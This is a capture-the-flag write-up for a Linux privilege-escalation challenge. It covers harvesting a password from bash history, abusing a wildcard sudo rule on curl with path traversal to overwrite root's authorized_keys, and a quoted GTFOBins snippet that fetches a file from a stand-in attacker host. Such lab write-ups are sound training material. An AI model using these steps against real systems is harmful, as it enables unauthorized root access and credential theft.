# Curly Fries
**Description:** Uh-oh, our friend Fry has been typing at the keyboard and running all kinds of commands, but his fingers are dirty from all the curly fries he has been eating!!

## Solution

1. ssh onto the machine as user.

2. I navigated to the fry user home directory

    I have privileges to their bash hisory where I found 

    ```
    sshpass -p iLoveCurlyFriesYumYumInMyTumTum ssh fry@localhost
    ```

    sweet, new creds as fry!!

3. I switched over to the user fry with the new credential found.

    ```
    sudo su fry
    ```

4. Now on as the fry user, I check for any prvileges I may have using

    ```
    sudo -l
    ```

    I notice i can run the following command as root. I also notice there is a * at the end so I can chain my commands.
    
    ```
    User fry may run the following commands on curly-fries-c8e4d1314fc58e67-7b54d6cd45-thnh6:
        (root) NOPASSWD: /usr/bin/curl 127.0.0.1\:8000/health-check*
    ```

5. I next look into [gtfobins](https://gtfobins.github.io) for anything related to curl so I can get sudo privilges and I find this. Gtfobins is helpful when trying to escalate privileges using Unix binaries in misconfigured systems, LIKE HERE!

    ```
    Sudo

    If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

        Fetch a remote file via HTTP GET request.

        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        sudo curl $URL -o $LFILE
    ```

    this is just what I needed. Now we can write files as root.

6. I open up another terminal and connect again but as the user we started off with, `user`. My goal now is to create a ssh key pair and copy over the public key in the root directory to ssh as root.
    
    1. first I must create the key pair
    
        ```
        ssh-keygen -t rsa
        ```
    
    1. now I can create the file that I will copy over. This file will be named `authorized_keys` because this is what ssh uses (under /root/.ssh/authorized_keys) to authenticate with our private key.

        ```
        cat id_rsa.pub > authorized_keys
        ```

    1. next we can start up our http server, luckily this machine has python installed so we can use that. I will start this in the directory of my file and with port 8000 (based on the command we are authorized to run as root for the user fry).

        ```
        python3 -m http.server 8000
        ```

    1. going back to our fry user, I can run the following command to download the file to /root/.ssh/

        ```
        sudo /usr/bin/curl 127.0.0.1\:8000/health-check/.././authorized_keys -o /root/.ssh/authorized_keys
        ```
    
        this command will download the `authorized_keys` file we created from the http server `user` is running then copy the output to /root/.ssh/ and we are allowed to do so thanks to our permissions as `fry`

7. At this point, we have created a key pair and the public key has been added to the root user.

    all that is left is to run the following to connect locally and get our flag in the root directory.

    ```
    ssh -i id_rsa root@localhost
    ```

![ultimate](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbzZoMDc1ODNxbzdzNmU1YjcxaDN5M3R4NXo5ejExcGlyODZwaG05ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/GRSnxyhJnPsaQy9YLn/giphy.gif)